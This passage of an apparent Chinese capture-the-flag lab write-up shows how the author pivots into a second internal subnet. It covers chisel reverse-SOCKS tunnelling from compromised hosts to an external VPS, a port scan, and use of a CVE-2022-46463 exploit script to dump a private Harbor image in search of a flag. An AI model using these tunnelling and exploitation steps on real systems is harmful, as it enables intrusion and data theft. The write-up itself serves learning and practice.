class="token number" style="color:#36acaa">21.8</span><span class="token plain"> MB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">eth1      Link encap:Ethernet  HWaddr 00:16:3e:04:42:65</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          inet addr:172.22.14.6  Bcast:172.22.255.255  Mask:255.255.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          inet6 addr: fe80::216:3eff:fe04:4265/64 Scope:Link</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          RX packets:860 errors:0 dropped:0 overruns:0 frame:0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          TX packets:863 errors:0 dropped:0 overruns:0 carrier:0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          collisions:0 txqueuelen:1000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          RX bytes:37216 </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">37.2</span><span class="token plain"> KB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">  TX bytes:37178 </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">37.1</span><span class="token plain"> KB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lo        Link encap:Local Loopback</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          inet6 addr: ::1/128 Scope:Host</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          RX packets:610 errors:0 dropped:0 overruns:0 frame:0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          TX packets:610 errors:0 dropped:0 overruns:0 carrier:0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          collisions:0 txqueuelen:1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          RX bytes:57067 </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">57.0</span><span class="token plain"> KB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">  TX bytes:57067 </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">57.0</span><span class="token plain"> KB</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="1722214024-双层内网建立中转枢纽">172.22.14.0/24 双层内网建立中转枢纽<a href="#1722214024-双层内网建立中转枢纽" class="hash-link" aria-label="172.22.14.0/24 双层内网建立中转枢纽的直接链接" title="172.22.14.0/24 双层内网建立中转枢纽的直接链接">​</a></h2>
<p><code>172.28.23.0/24</code> 内网已经建立代理，所以需要针对二层的 <code>172.22.14.0/24</code> 建立代理</p>
<p>首先，需要将公网 vps 的 chisel 监听端口 <code>1337</code> 转发到内网 <code>172.28.23.17 (入口点)</code></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@portal:/tmp$ ./chisel_1.9.1_linux_amd64 client </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:1337 </span><span class="token number" style="color:#36acaa">1337</span><span class="token plain">:11337 </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:14:59 client: Connecting to ws://139.*.*.*:1337</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:14:59 client: tun: proxy</span><span class="token comment" style="color:#999988;font-style:italic">#1337=&gt;11337: Listening</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:15:00 client: Connected </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Latency </span><span class="token number" style="color:#36acaa">43</span><span class="token plain">.287612ms</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后在一层内网与二层内网共在的靶机上建立转发</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">172.28.23.26 &amp; 172.22.14.6</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@ubuntu-oa:/tmp$ ./chisel_1.9.1_linux_amd64 client </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.17:1337 R:0.0.0.0:10001:socks </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:24:51 client: Connecting to ws://172.28.23.17:1337</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:24:51 server: session</span><span class="token comment" style="color:#999988;font-style:italic">#8: tun: proxy#R:10001=&gt;socks: Listening</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:24:51 client: Connected </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Latency </span><span class="token number" style="color:#36acaa">47</span><span class="token plain">.995041ms</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>成功建立二层内网的代理</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="内网扫描-1722214024">内网扫描 172.22.14.0/24<a href="#内网扫描-1722214024" class="hash-link" aria-label="内网扫描 172.22.14.0/24的直接链接" title="内网扫描 172.22.14.0/24的直接链接">​</a></h2>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">start </span><span class="token function" style="color:#d73a49">ping</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">icmp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> Target </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.6     is alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">icmp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> Target </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.37    is alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">icmp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> Target </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.46    is alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Icmp alive hosts len is: </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.46:80 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.46:22 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.37:22 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.6:80 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.6:22 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.6:21 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.37:2379 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.37:10250 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> alive ports len is: </span><span class="token number" style="color:#36acaa">8</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start vulscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> WebTitle: http://172.22.14.6        code:200 len:13693  title: 新翔 OA 管理系统 - OA 管理平台联系电话：13849422648 微信同号，QQ958756413</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> WebTitle: http://172.22.14.46       code:200 len:785    title:Harbor</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> InfoScan:http://172.22.14.46       </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">Harbor</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> ftp://172.22.14.6:21:anonymous</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">OASystem.zip</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> WebTitle: https://172.22.14.37:10250 code:404 len:19     title:None</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> http://172.22.14.46/swagger.json poc-yaml-swagger-ui-unauth </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">path swagger.json</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="172221446-harbor-镜像泄露">172.22.14.46 Harbor 镜像泄露<a href="#172221446-harbor-镜像泄露" class="hash-link" aria-label="172.22.14.46 Harbor 镜像泄露的直接链接" title="172.22.14.46 Harbor 镜像泄露的直接链接">​</a></h2>
<p>使用 <code>CVE-2022-46463</code> 漏洞，将 Harbor 上的信息  进行获取</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~/pocs/CVE-2022-46463</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ proxychains4 </span><span class="token parameter variable" style="color:#36acaa">-q</span><span class="token plain"> python3 harbor.py http://172.22.14.46</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> API version used v2.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> project/projectadmin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> project/portal</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> library/nginx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> library/redis</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> harbor/secret</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>将 <code>harbor/secret</code> 这个镜像获取下来分析</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~/pocs/CVE-2022-46463</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ proxychains python3 harbor.py http://172.22.14.46 </span><span class="token parameter variable" style="color:#36acaa">--dump</span><span class="token plain"> harbor/secret </span><span class="token parameter variable" style="color:#36acaa">--v2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> config </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> found: /etc/proxychains4.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> DLL init: proxychains-ng </span><span class="token number" style="color:#36acaa">4.17</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Strict chain  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:10001  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.46:80  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Strict chain  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:10001  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.46:80  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Dumping </span><span class="token builtin class-name">:</span><span class="token plain"> harbor/secret:latest</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Strict chain  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:10001  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.46:80  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Strict chain  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:10001  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.46:80  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Downloading </span><span class="token builtin class-name">:</span><span class="token plain"> 58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">Errno </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Operation not permitted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Strict chain  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:10001  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.46:80  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Downloading </span><span class="token builtin class-name">:</span><span class="token plain"> b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Strict chain  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:10001  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.46:80  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Downloading </span><span class="token builtin class-name">:</span><span class="token plain"> da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Strict chain  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:10001  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.46:80  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Downloading </span><span class="token builtin class-name">:</span><span class="token plain"> fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Strict chain  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:10001  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.46:80  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Downloading </span><span class="token builtin class-name">:</span><span class="token plain"> 413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Strict chain  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:10001  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.46:80  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Downloading </span><span class="token builtin class-name">:</span><span class="token plain"> 8bd8c9755cbf83773a6a54eff25db438debc22d593699038341b939e73974653</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后对镜像进行分析，在其中找到 flag 文件</p>
